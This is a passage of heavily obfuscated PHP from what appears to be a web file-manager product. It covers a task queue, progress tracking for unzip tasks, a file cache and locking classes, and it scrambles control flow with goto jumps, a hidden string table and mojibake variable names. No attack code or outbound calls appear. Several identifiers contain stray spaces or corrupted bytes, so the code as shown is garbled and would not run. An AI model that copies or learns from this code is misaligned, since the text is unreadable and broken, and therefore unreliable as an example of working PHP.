¢ÖÍ±Ñ[1597]); goto d³ì‘ò›·ù; CãÙã‹À: } public static function run() { goto B»ÄàÑ¿‰; EÈ…†¦ŒØ¤: return !0; goto B“šÍº³§; CÊÁ°ÖİˆÏ: if (!$cïõ¯¢í²Â) { return !1; } self::setAll($b‘–İœÉÔè); $DôË‚¥İ = timeFloat(); goto D©ª·Ëºµ; D©ª·Ëºµ: try { Hook::apply($cïõ¯¢í²Â[$DÈÅ¯…¼š[261]], $cïõ¯¢í²Â[$DÈÅ¯…¼š[1595]]); } catch (Exception $c´Ö‚²¸˜Ì) { } $f‹ŠæîÍáŠ = number_format(timeFloat() - $DôË‚¥İ, 3) . $DÈÅ¯…¼š[1539]; write_log($DÈÅ¯…¼š[1598] . $cïõ¯¢í²Â[$DÈÅ¯…¼š[429]] . $DÈÅ¯…¼š[1599] . $f‹ŠæîÍáŠ, $DÈÅ¯…¼š[1597]); goto EÈ…†¦ŒØ¤; B»ÄàÑ¿‰: $DÈÅ¯…¼š =& $_SERVER[´¬]; $b‘–İœÉÔè = self::getAll(); $cïõ¯¢í²Â = array_shift($b‘–İœÉÔè); goto CÊÁ°ÖİˆÏ; B“šÍº³§: } public static function count() { $ašàíÖ¥¸î = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ašàíÖ¥¸î) { return 0; } return intval($ašàíÖ¥¸î); } public static function getAll() { $dŠ¯ƒ¤´Ô¤ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$dŠ¯ƒ¤´Ô¤) { return array(); } return $dŠ¯ƒ¤´Ô¤; } public static function setAll($eƒ”ÙØ™ÃÁ) { $B°Ø¶ÖÜ¤ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($eƒ”ÙØ™ÃÁ), $B°Ø¶ÖÜ¤); Cache::set(self::QUEUE_DATA, $eƒ”ÙØ™ÃÁ, $B°Ø¶ÖÜ¤); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($d²ÕÇ—¼ºí, $bôÁÅ§òÇ… = 5.0) { if (!$d²ÕÇ—¼ºí) { return; } $CêÀ¡ç‘¤… = Cache::get($d²ÕÇ—¼ºí); if (!$CêÀ¡ç‘¤… || timeFloat() - floatVal($CêÀ¡ç‘¤…) >= $bôÁÅ§òÇ…) { Cache::set($d²ÕÇ—¼ºí, timeFloat(), $bôÁÅ§òÇ… * 10); return !0; } return !1; } public static function timeLimitCall($FÃê—­Ó®°, $aÚÅ×áËè, $FŠÅà±àÔ, $Eöº¿ = 5.0) { goto Dº½›Ë…Î†; Bº“·½„Û: if (is_array($c§‡éÎáäˆ[$FÃê—­Ó®°])) { $c›”†šö¶Ü[$fƒ’„¸¦˜[1602]] = $c§‡éÎáäˆ[$FÃê—­Ó®°][$fƒ’„¸¦˜[1602]]; } if (is_array($c§‡éÎáäˆ[$FÃê—­Ó®°])) { if (timeFloat() - $c§‡éÎáäˆ[$FÃê—­Ó®°][$fƒ’„¸¦˜[1601]] < $c›”†šö¶Ü[$fƒ’„¸¦˜[196]] * 0.3) { return; } $c›”†šö¶Ü[$fƒ’„¸¦˜[1602]] = $c§‡éÎáäˆ[$FÃê—­Ó®°][$fƒ’„¸¦˜[1602]]; } $c§‡éÎáäˆ[$FÃê—­Ó®°] = $c›”†šö¶Ü; goto DƒÏ£ä¯¥ƒ; a£‰„âº‰·: $c¶ã†æÃ«ñ = $fƒ’„¸¦˜[1600]; $c§‡éÎáäˆ = Cache::get($c¶ã†æÃ«ñ, !0); $c›”†šö¶Ü = array($fƒ’„¸¦˜[1601] => timeFloat(), $fƒ’„¸¦˜[1602] => timeFloat(), $fƒ’„¸¦˜[261] => $aÚÅ×áËè, $fƒ’„¸¦˜[1595] => $FŠÅà±àÔ, $fƒ’„¸¦˜[196] => $Eöº¿); goto Bº“·½„Û; Dº½›Ë…Î†: $fƒ’„¸¦˜ =& $_SERVER[´¬]; if (!$FÃê—­Ó®° || !$aÚÅ×áËè) { return; } self::$asyncAdd = !0; goto a£‰„âº‰·; DƒÏ£ä¯¥ƒ: Cache::set($c¶ã†æÃ«ñ, $c§‡éÎáäˆ, 60); Cache::removeMemory($c¶ã†æÃ«ñ); write_log($fƒ’„¸¦˜[1603] . $FÃê—­Ó®° . $fƒ’„¸¦˜[68] . $aÚÅ×áËè, $fƒ’„¸¦˜[1597]); goto aÕ¸¿ª„§‚; aÕ¸¿ª„§‚: } public static function timeLimitCallLoop() { goto a„ÏèÛÂÛ; eô’‰»„Ú¾: if (!$DÔ³ÍÚœ»® && !self::$asyncAdd) { return; } $bù¦¸¢Ôà = $BôÖ‰ó¬Š¦[1600]; $c©ñÜõçê¹ = Cache::get($bù¦¸¢Ôà, !0); goto cÆåÃá¯Ğ; E«Ãíƒ˜–Ü: if (!$DâÅâ°„ƒˆ) { return Cache::remove($bù¦¸¢Ôà); } Cache::set($bù¦¸¢Ôà, $DâÅâ°„ƒˆ, 60); Cache::removeMemory($bù¦¸¢Ôà); goto Cã®óêÔ; a¡œÄÈ™©ª: $DâÅâ°„ƒˆ = array(); foreach ($c©ñÜõçê¹ as $DŒØ“¤Ğ• => $d¾Ş­£•Å¼) { if ($cµ††İÁ - $d¾Ş­£•Å¼[$BôÖ‰ó¬Š¦[1602]] > $d¾Ş­£•Å¼[$BôÖ‰ó¬Š¦[196]]) { $bí¡ÛÏ‘’á = !0; try { Hook::apply($d¾Ş­£•Å¼[$BôÖ‰ó¬Š¦[261]], $d¾Ş­£•Å¼[$BôÖ‰ó¬Š¦[1595]]); write_log($BôÖ‰ó¬Š¦[1605] . $DŒØ“¤Ğ• . $BôÖ‰ó¬Š¦[68] . $d¾Ş­£•Å¼[$BôÖ‰ó¬Š¦[261]] . $BôÖ‰ó¬Š¦[1606] . ACTION, $BôÖ‰ó¬Š¦[1597]); } catch (Exception $E ñéÂ«Î) { } continue; } $DâÅâ°„ƒˆ[$DŒØ“¤Ğ•] = $d¾Ş­£•Å¼; } if (!$bí¡ÛÏ‘’á) { return; } goto E«Ãíƒ˜–Ü; a„ÏèÛÂÛ: $BôÖ‰ó¬Š¦ =& $_SERVER[´¬]; $aÓ—ñ¢ƒ®³ = array($BôÖ‰ó¬Š¦[1604]); $DÔ³ÍÚœ»® = in_array(strtolower(ACTION), $aÓ—ñ¢ƒ®³); goto eô’‰»„Ú¾; cÆåÃá¯Ğ: if (!$c©ñÜõçê¹ || count($c©ñÜõçê¹) <= 0) { return; } $bí¡ÛÏ‘’á = !1; $cµ††İÁ = timeFloat(); goto a¡œÄÈ™©ª; Cã®óêÔ: } public static function finished($BòÑŒÂ˜İ, $f‹’°—¼šÁ) { $b¹¬‡é³í =& $_SERVER[´¬]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($b¹¬‡é³í[261] => $BòÑŒÂ˜İ, $b¹¬‡é³í[1595] => $f‹’°—¼šÁ); } private static function finishedRun() { $F°ÓğÊŸö =& $_SERVER[´¬]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $E˜Ä†ÏÑ‹¤) { try { Hook::apply($E˜Ä†ÏÑ‹¤[$F°ÓğÊŸö[261]], $E˜Ä†ÏÑ‹¤[$F°ÓğÊŸö[1595]]); } catch (Exception $eë„“ßˆÅ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Câ–Û÷ˆ‘‹; B¢¢Â˜††ò: if (!$BŠí‡ñËİ[$a‡š¿ÙªçÔ[1432]]) { $BŠí‡ñËİ[$a‡š¿ÙªçÔ[1432]] = LNG($a‡š¿ÙªçÔ[1611]); } goto FçªÅˆ¹Ç¢; BÔ½¶ÄÚ»•: Hook::bind($a‡š¿ÙªçÔ[1090], array($this, $a‡š¿ÙªçÔ[1609])); $BŠí‡ñËİ =& $this->task; $BŠí‡ñËİ[$a‡š¿ÙªçÔ[1610]] = $a‡š¿ÙªçÔ[1095]; goto B¢¢Â˜††ò; Câ–Û÷ˆ‘‹: $a‡š¿ÙªçÔ =& $_SERVER[´¬]; parent::startAfter(); Hook::bind($a‡š¿ÙªçÔ[1607], array($this, $a‡š¿ÙªçÔ[1608])); goto BÔ½¶ÄÚ»•; FçªÅˆ¹Ç¢: } protected function endAfter() { $fíœÅê¨Ú =& $_SERVER[´¬]; parent::endAfter(); Hook::unbind($fíœÅê¨Ú[1607], array($this, $fíœÅê¨Ú[1608])); Hook::unbind($fíœÅê¨Ú[1090], array($this, $fíœÅê¨Ú[1609])); } public function updateAfter() { $f®ÊâÎ¢‚¶ =& $_SERVER[´¬]; $aÇõ£óˆå =& $this->task; if (!$aÇõ£óˆå[$f®ÊâÎ¢‚¶[1022]] || !$aÇõ£óˆå[$f®ÊâÎ¢‚¶[723]]) { return; } if ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1610]] == $f®ÊâÎ¢‚¶[1095]) { $F¡·‚ˆ¨ ™ = 0; if ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1569]]) { $F¡·‚ˆ¨ ™ = $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1570]] / $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1569]]; } $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1527]] = $F¡·‚ˆ¨ ™ * 0.3; } else { if ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1610]] == $f®ÊâÎ¢‚¶[310]) { $F¡·‚ˆ¨ ™ = $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1037]] / $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1022]]; $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1527]] = 0.3 + $F¡·‚ˆ¨ ™ * 0.4; } else { if ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1610]] == $f®ÊâÎ¢‚¶[107]) { $a£­ãÏª‹¨ = 0; if ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1571]] == $f®ÊâÎ¢‚¶[107]) { $a£­ãÏª‹¨ = $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1570]]; } $F¡·‚ˆ¨ ™ = ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1574]] + $a£­ãÏª‹¨) / $aÇõ£óˆå[$f®ÊâÎ¢‚¶[723]]; $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1527]] = 0.3 + 0.4 + $F¡·‚ˆ¨ ™ * 0.3; } } } if ($aÇõ£óˆå[$f®ÊâÎ¢‚¶[1527]] > 0) { $EÛ‘Ê÷Øê = timeFloat() - $aÇõ£óˆå[$f®ÊâÎ¢‚¶[749]] - $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1530]]; $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1531]] = $EÛ‘Ê÷Øê * (1 - $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1527]]) / $aÇõ£óˆå[$f®ÊâÎ¢‚¶[1527]]; } } public function addFile($A½İèİêñ–) { goto b¸†ñøà; b¸†ñøà: $cÓœ¾±ËÊ =& $_SERVER[´¬]; $fÖ°Ñåò¥ˆ =& $this->task; $Bçñòøƒõ„ = IO::info($A½İèİêñ–); goto d¤œÀ¬“™; dÂ¡ÛÍÍÅœ: $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1022]] = 1; $d×§©¥³‡ = 0; $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1578]] = array($cÓœ¾±ËÊ[1579] => $d×§©¥³‡ + 1, $cÓœ¾±ËÊ[411] => $Bçñòøƒõ„[$cÓœ¾±ËÊ[28]], $cÓœ¾±ËÊ[76] => $Bçñòøƒõ„[$cÓœ¾±ËÊ[76]], $cÓœ¾±ËÊ[493] => $Bçñòøƒõ„[$cÓœ¾±ËÊ[493]] ? $Bçñòøƒõ„[$cÓœ¾±ËÊ[493]] : $Bçñòøƒõ„[$cÓœ¾±ËÊ[76]]); goto d‡ùèåÉ; d¤œÀ¬“™: $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1567]] = $Bçñòøƒõ„[$cÓœ¾±ËÊ[28]]; $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1569]] = $Bçñòøƒõ„[$cÓœ¾±ËÊ[78]]; $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1570]] = 0; goto Fğç ˆõÅ; d‡ùèåÉ: $this->update(); goto f‡¢³‹ëğ; Fğç ˆõÅ: $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1024]] = $cÓœ¾±ËÊ[1586]; $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[1571]] = $cÓœ¾±ËÊ[1095]; $fÖ°Ñåò¥ˆ[$cÓœ¾±ËÊ[723]] = $Bçñòøƒõ„[$cÓœ¾±ËÊ[78]]; goto dÂ¡ÛÍÍÅœ; f‡¢³‹ëğ: } public function unzipAfter($A¤±‹Óë‹Œ) { goto D¬îÉó±‡®; B…»ÓÆ·¶: $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1037]] = 0; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1569]] = 0; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1570]] = 0; goto bõËÍ©ßİÄ; D¬îÉó±‡®: $d³ÏÙÔ •ë =& $_SERVER[´¬]; $fÜŸ·¤œ¸Â =& $this->task; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1610]] = $d³ÏÙÔ •ë[107]; goto EÜîá½Æš; Bî˜£Ùâƒô: if ($dè¼Æ·ß¶§[$d³ÏÙÔ •ë[29]] == $d³ÏÙÔ •ë[192]) { $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1022]] = 1; } else { $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1022]] = $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[81]][$d³ÏÙÔ •ë[79]]; } $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1024]] = $d³ÏÙÔ •ë[33]; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1571]] = 0; goto B…»ÓÆ·¶; A›ÈÂÇ‰“×: $this->update(); self::log($d³ÏÙÔ •ë[1612] . json_encode(array($fÜŸ·¤œ¸Â, $dè¼Æ·ß¶§))); goto a¬“Òò”; bõËÍ©ßİÄ: $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1567]] = $d³ÏÙÔ •ë[33]; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1574]] = 0; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[723]] = $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[78]]; goto A›ÈÂÇ‰“×; EÜîá½Æš: $dè¼Æ·ß¶§ = IO::infoWithChildren($A¤±‹Óë‹Œ); $f×ªÕä¾¥¯ = 0; $fÜŸ·¤œ¸Â[$d³ÏÙÔ •ë[1578]] = array($d³ÏÙÔ •ë[1579] => $f×ªÕä¾¥¯ + 1, $d³ÏÙÔ •ë[411] => $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[28]], $d³ÏÙÔ •ë[76] => $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[76]], $d³ÏÙÔ •ë[493] => $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[493]] ? $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[493]] : $dè¼Æ·ß¶§[$d³ÏÙÔ •ë[76]]); goto Bî˜£Ùâƒô; a¬“Òò”: } public function nameParse($b»Š‹¯óÇë) { goto f„†İà¡Üõ; bŞ¡ÜÖÜ¡È: $this->update(); goto cŒß‚Ú°ã ; f§Ô³Ú¹—ğ: $Fç¾ó¶ëá = get_path_this($b»Š‹¯óÇë); if (strstr($Fç¾ó¶ëá, $dŒƒå‘øƒ²[95])) { $FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[1037]] += 1; $FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[1022]] += 1; } $FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[1567]] = $b»Š‹¯óÇë; goto bŞ¡ÜÖÜ¡È; f„†İà¡Üõ: $dŒƒå‘øƒ² =& $_SERVER[´¬]; $FÎ˜Š¹íÖ =& $this->task; if ($FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[1610]] == $dŒƒå‘øƒ²[1095]) { $FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[1610]] = $dŒƒå‘øƒ²[310]; $FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[1574]] = 0; $FÎ˜Š¹íÖ[$dŒƒå‘øƒ²[723]] = 0; } goto f§Ô³Ú¹—ğ; cŒß‚Ú°ã : } } goto B°Æ«ÎšÀ¬; cô²óÒâ§’: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($f®‚–çµõ³, $b‚ÅæêæÏ) { $Bøï‘ë‡Ç¿ =& $_SERVER[´¬]; $this->cachePath = $f®‚–çµõ³[$Bøï‘ë‡Ç¿[76]]; $this->prefix = $Bøï‘ë‡Ç¿[799]; $this->cacheTime = $b‚ÅæêæÏ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($cÇŠ°öß´§) { $bÏ¼«Óæßè =& $_SERVER[´¬]; $cÇŠ°öß´§ = str_replace(array($bÏ¼«Óæßè[800], $bÏ¼«Óæßè[97], $bÏ¼«Óæßè[70]), $bÏ¼«Óæßè[801], $cÇŠ°öß´§); return $this->cachePath . $bÏ¼«Óæßè[802] . $cÇŠ°öß´§ . $bÏ¼«Óæßè[803]; } public function set($B‹´¶Ñ³‹‘, $E²«ùì¡‰Å, $eÊ›ÍÎÌš = false) { $fË‡……áõ = $this->getFile($B‹´¶Ñ³‹‘); if (file_put_contents($fË‡……áõ, $this->prefix . $E²«ùì¡‰Å, LOCK_EX)) { return !0; } @unlink($fË‡……áõ); return !1; } public function get($Aéè”Ö¦Ñˆ) { $Fğ­‰¨ = $this->getFile($Aéè”Ö¦Ñˆ); if (file_exists($Fğ­‰¨) && filemtime($Fğ­‰¨) < time() - $this->cacheTime) { @unlink($Fğ­‰¨); return !1; } $E›Šã¶¯¯³ = @file_get_contents($Fğ­‰¨); return substr($E›Šã¶¯¯³, strlen($this->prefix)); } public function remove($aøÜéµ©ƒ) { $f¥‡¸šÅ¸í = $this->getFile($aøÜéµ©ƒ); return @unlink($f¥‡¸šÅ¸í); } public function deleteAll() { $C¸ø±ˆÄº¿ =& $_SERVER[´¬]; $E÷ÓÒ›Ë¹Í = scandir($this->cachePath); foreach ($E÷ÓÒ›Ë¹Í as $bÛ¡Ü¥ï) { $DÚÒÃ¡šˆÊ = $this->cachePath . $bÛ¡Ü¥ï; if (strpos($DÚÒÃ¡šˆÊ, $C¸ø±ˆÄº¿[803]) && strpos($DÚÒÃ¡šˆÊ, $C¸ø±ˆÄº¿[804])) { @unlink($DÚÒÃ¡šˆÊ); } } } public function clearTimeout() { $DœØÆ×‹¶ø =& $_SERVER[´¬]; $aÌñ«­³Æâ = scandir($this->cachePath); foreach ($aÌñ«­³Æâ as $Fğí‰¤ĞÉ‘) { $aä’¾‰‹î = $this->cachePath . $Fğí‰¤ĞÉ‘; if (strpos($aä’¾‰‹î, $DœØÆ×‹¶ø[803]) && strpos($aä’¾‰‹î, $DœØÆ×‹¶ø[804]) && filemtime($aä’¾‰‹î) < time() - $this->cacheTime) { @unlink($aä’¾‰‹î); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto cË¯×Â¦÷›; cË¯×Â¦÷›: $B±¨Ã²Ÿ­Š =& $_SERVER[´¬]; if (self::$handle) { return self::$handle; } $EÄ¤½Ë°Ä = $GLOBALS[$B±¨Ã²Ÿ­Š[6]][$B±¨Ã²Ÿ­Š[346]]; goto fİÙÕ›Á…ù; fİÙÕ›Á…ù: self::$timeout = $EÄ¤½Ë°Ä[$B±¨Ã²Ÿ­Š[805]] ? $EÄ¤½Ë°Ä[$B±¨Ã²Ÿ­Š[805]] : 10; $eÙÔô‰Úæƒ = _get($GLOBALS[$B±¨Ã²Ÿ­Š[6]], $B±¨Ã²Ÿ­Š[806]); $d÷ÍËà¡· = $EÄ¤½Ë°Ä[$B±¨Ã²Ÿ­Š[792]] ? $EÄ¤½Ë°Ä[$B±¨Ã²Ÿ­Š[792]] : $B±¨Ã²Ÿ­Š[192]; goto BƒØÊíÉ—¨; BƒØÊíÉ—¨: if ($d÷ÍËà¡· == $B±¨Ã²Ÿ­Š[17] && $eÙÔô‰Úæƒ == $B±¨Ã²Ÿ­Š[9]) { $d÷ÍËà¡· = $B±¨Ã²Ÿ­Š[192]; } switch ($d÷ÍËà¡·) { case $B±¨Ã²Ÿ­Š[795]: self::$handle = new CacheLockRedis(); break; case $B±¨Ã²Ÿ­Š[796]: self::$handle = new CacheLockMemcached(); break; case $B±¨Ã²Ÿ­Š[17]: self::$handle = new CacheLockDatabase(); break; case $B±¨Ã²Ÿ­Š[192]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C©ù‚¿…Ã; C©ù‚¿…Ã: } private static function key($Dã˜‚¬¥Ÿ©) { return $_SERVER[´¬][807] . Cache::key($Dã˜‚¬¥Ÿ©); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($B¶ËèÔÕÃ = '') { self::$errorMsg = $B¶ËèÔÕÃ; } public static function lockGlobal($BÃØí‘Ù•ã, $cï®ß×°Œã) { return self::lock($BÃØí‘Ù•ã, $cï®ß×°Œã, !0); } public static function lock($Añ¸òå»¸é, $CÄ Ê£†øò = false, $CÍš„Ç†ò = false) { goto eëË¶º´; d…ÛõîÏ”¬: $CÄ Ê£†øò = $CÄ Ê£†øò ? $CÄ Ê£†øò : self::$timeout; $b†ñ–½® = $Ağ¨óŞ¸³Ô->lock($A¨Ä³»¯‘µ, $CÄ Ê£†øò); if (!$b†ñ–½®) { $DÄ‘¬“Å¿ = "\154\157\x63\x6b\x20\x65\x72\162\x6f\x72\x3b\153\145\171\75{$Añ¸òå»¸é}\73\164\151\x6d\145\x3d{$CÄ Ê£†øò}\73" . self::$errorMsg . $Cª½§¶İÚï[68] . get_caller_msg(); $dĞç¾†šˆ = LNG($Cª½§¶İÚï[808]) . "\x28{$CÄ Ê£†øò}\163\51\x2e" . LNG($Cª½§¶İÚï[809]); $dĞç¾†šˆ .= $Cª½§¶İÚï[810]; if (is_string(self::$errorMsg) && self::$errorMsg) { $dĞç¾†šˆ = $dĞç¾†šˆ . $Cª½§¶İÚï[811] . self::$errorMsg; } write_log($DÄ‘¬“Å¿, $Cª½§¶İÚï[812]); show_json($dĞç¾†šˆ, !1); } goto D“Ëé¥ÎâÅ; D“Ëé¥ÎâÅ: if (!$CÍš„Ç†ò) { self::$lockItem[$A¨Ä³»¯‘µ] = !0; } return $b†ñ–½®; goto eöÅ…çèøæ; eëË¶º´: $Cª½§¶İÚï =& $_SERVER[´¬]; $Ağ¨óŞ¸³Ô = self::init(); $A¨Ä³»¯‘µ = self::key($Añ¸òå»¸é); goto d…ÛõîÏ”¬; eöÅ…çèøæ: } public static function lockGet($e“´Ìæ¾Ä×) { $C×¡ŸŠï²ï = self::key($e“´Ìæ¾Ä×); if (self::$lockItem[$C×¡ŸŠï²ï]) { return self::$lockItem[$C×¡ŸŠï²ï]; } return self::init()->lockGet($C×¡ŸŠï²ï); } public static function unlock($D—¿ç–í„±) { $AĞñßª£… = self::key($D—¿ç–í„±); self::$lockItem[$AĞñßª£…] = null; return self::init()->unlock($AĞñßª£…); } public static function unlockRuntime() { $CÑğÓÄ©ä± =& $_SERVER[´¬]; $eÛø©Ã¦‰Ô = self::init(); $AŠËçİà°× = !1; foreach (self::$lockItem as $eŠ®ç®ÁˆÍ => $b¥Â¨Â‰¾½) { if (!$b¥Â¨Â‰¾½) { continue; } $eÛø©Ã¦‰Ô->unlock($eŠ®ç®ÁˆÍ); if (!$AŠËçİà°×) { $AŠËçİà°× = !0; write_log($CÑğÓÄ©ä±[813] . $eŠ®ç®ÁˆÍ . $CÑğÓÄ©ä±[68] . get_caller_msg(), $CÑğÓÄ©ä±[812]); continue; } write_log($CÑğÓÄ©ä±[813] . $eŠ®ç®ÁˆÍ, $CÑğÓÄ©ä±[812]); } self::fileUnlockAll(); } public static function fileLock($DÅ¤õ’Íò) { goto Bõòè×‘Æ²; B¡õºÑÀ–Á: $Eƒ´Í›ˆ‚İ = fopen(DATA_PATH . $DÅ¤õ’Íò . $AÉŒâËƒ‘‘[815], $AÉŒâËƒ‘‘[816]); if (!$Eƒ´Í›ˆ‚İ) { return !1; } $GLOBALS[$AÉŒâËƒ‘‘[814]][$DÅ¤õ’Íò] = $Eƒ´Í›ˆ‚İ; goto b¾©ÑĞİï¦; aë‡×ß¶Æ: return !1; goto C„×Š‹Îñ³; Bõòè×‘Æ²: $AÉŒâËƒ‘‘ =& $_SERVER[´¬]; if (!$GLOBALS[$AÉŒâËƒ‘‘[814]]) { $GLOBALS[$AÉŒâËƒ‘‘[814]] = array(); } $GLOBALS[$AÉŒâËƒ‘‘[814]][$DÅ¤õ’Íò] = !1; goto B¡õºÑÀ–Á; b¾©ÑĞİï¦: if (flock($Eƒ´Í›ˆ‚İ, LOCK_EX)) { return !0; } self::unlock($DÅ¤õ’Íò); show_json($AÉŒâËƒ‘‘[817], !1); goto aë‡×ß¶Æ; C„×Š‹Îñ³: } public static function fileUnlock($E†’ÂÖâªì) { $a–ÌèŠ”½ =& $_SERVER[´¬]; $fç¦¤¨™› = $GLOBALS[$a–ÌèŠ”½[814]][$E†’ÂÖâªì]; if (!$fç¦¤¨™›) { return; } $GLOBALS[$a–ÌèŠ”½[814]][$E†’ÂÖâªì] = !1; flock($fç¦¤¨™›, LOCK_UN); fclose($fç¦¤¨™›); } public static function fileUnlockAll() { $dÍÛ‘¾¨ÊÒ =& $_SERVER[´¬]; if (!$GLOBALS[$dÍÛ‘¾¨ÊÒ[814]]) { return; } foreach ($GLOBALS[$dÍÛ‘¾¨ÊÒ[814]] as $e™·îƒòèí => $DèğğÓ¶Õ) { if (!$DèğğÓ¶Õ) { continue; } $GLOBALS[$dÍÛ‘¾¨ÊÒ[814]][$e™·îƒòèí] = !1; flock($DèğğÓ¶Õ, LOCK_UN); fclose($DèğğÓ¶Õ); } $GLOBALS[$dÍÛ‘¾¨ÊÒ[814]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto aÇÈßÊÜ‚; bğæ‚ÛÒ£­: define($_SERVER[´¬][236], 2); define($_SERVER[´¬][237], 3); define($_SERVER[´¬][238], 1); goto B„ĞÙéï¤; d¦¢ÊÛªˆñ: class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\x52\145\143\x79\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\x72\x46\151\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\162\x46\151\154\145\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\x70\x52\157\x6f\x74\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\123\150\x61\x72\145\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\x65\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\141\162\x65\111\164\145\x6d\114\151\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\153\175"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\173\165\x73\145\x72\122\x65\x6e\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\x65\162\x7d"; public static function typeList() { $E‚çäÌ±ù =& $_SERVER[´¬]; return array($E‚çäÌ±ù[1139] => self::KOD_SOURCE, $E‚çäÌ±ù[1140] => self::KOD_USER_RECYCLE, $E‚çäÌ±ù[1141] => self::KOD_USER_FAV, $E‚çäÌ±ù[1142] => self::KOD_USER_FILE_TAG, $E‚çäÌ±ù[1143] => self::KOD_USER_FILE_TYPE, $E‚çäÌ±ù[1144] => self::KOD_GROUP_ROOT_SELF, $E‚çäÌ±ù[1145] => self::KOD_USER_SHARE, $E‚çäÌ±ù[1146] => self::KOD_USER_SHARE_LINK, $E‚çäÌ±ù[1147] => self::KOD_USER_SHARE_TO_ME, $E‚çäÌ±ù[1148] => self::KOD_SHARE_ITEM, $E‚çäÌ±ù[1149] => self::KOD_SHARE_LINK, $E‚çäÌ±ù[1150] => self::KOD_SEARCH, $E‚çäÌ±ù[1151] => self::KOD_BLOCK, $E‚çäÌ±ù[1152] => self::KOD_IO, $E‚çäÌ±ù[1153] => self::KOD_USER_RECENT, $E‚çäÌ±ù[1154] => self::KOD_USER_DRIVER); } public static function parse($aèêÅ¦¢Û) { goto b‰ö®„¡Ò²; f¯£ÄæÛÕ: preg_match($a…êÀî…‡Š[1155], $aèêÅ¦¢Û, $F‘ç¯ßòÛÈ); $A¼ŞÀŠÆ¿¶ = array($a…êÀî…‡Š[413] => !1, $a…êÀî…‡Š[1156] => !1, $a…êÀî…‡Š[410] => !1, 